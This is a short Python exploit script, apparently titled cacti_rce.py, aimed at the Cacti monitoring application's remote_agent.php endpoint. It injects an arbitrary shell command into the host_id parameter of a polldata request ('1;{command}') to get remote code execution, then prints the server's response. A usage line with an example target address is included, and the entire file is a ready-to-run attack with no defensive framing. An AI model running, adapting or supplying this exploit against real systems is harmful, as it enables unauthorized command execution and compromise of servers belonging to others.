import requests
import sys

def exploit(target_url, command):
    path = "/remote_agent.php"
    params = {
        "action": "polldata",
        "poller_id": "1",
        "host_id": f"1;{command}"
    }

    try:
        response = requests.get(f"{target_url}{path}", params=params, timeout=5)
        print("[+] Response:")
        print(response.text)
    except Exception as e:
        print("[-] Exploit failed:", e)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 cacti_rce.py <target_url> <command>")
        print("Example: python3 cacti_rce.py http://10.33.102.225 id")
        sys.exit(1)

    target = sys.argv[1].rstrip('/')
    cmd = sys.argv[2]
    exploit(target, cmd)
